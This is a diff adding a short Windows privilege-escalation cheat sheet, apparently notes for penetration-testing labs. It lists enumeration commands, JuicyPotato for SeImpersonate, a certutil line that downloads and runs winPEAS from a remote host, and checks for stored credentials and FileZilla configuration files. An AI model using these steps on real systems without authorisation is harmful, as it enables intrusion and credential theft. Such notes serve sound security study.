@@ -1,0 +1,31 @@
+commands to run:
+
+whoami /priv
+  - Is SeImpersonate Enabled?
+    - Can exploit this and elevate privileges with JuicyPotato
+  - Google out privileges that are enabled with priv esc at the end:
+    - Ex. SeImpersonate priv esc
+    
+after running a whoami check what user you are and then run:
+  - net user whoyouare
+    - Ex. whoami
+       - brett\Domain
+       - net user brett
+    - Check what group you are in. If you are apart of the administrator group can you add a domain user?
+    
+certutil -urlcache -split -f http://192.168.178.190/winpeas.exe
+  - now run winpeas.exe
+  - check for anything highlighted in red. Sometimes you will find credentials or certain services that you can hijack dlls or exes
+  
+cmdkey /list
+  - might be able to find stored credentials in here
+  
+ cd "C:\Program Files"
+  - check if there is any 3rd party software and make sure to google that out to see if there is any priv esc for it
+  - also make sure you are checking Program Files (x86)
+  
+Is FileZilla ftp open on the machine?
+  - Check C:\FileZilla and look for an xml file
+  - enter: type "C:/Program Files/FileZilla Server/FileZilla Server.xml"
+  
+Check out other windows priv esc cheat sheets for more commands. UAC bypass is another great one to check out
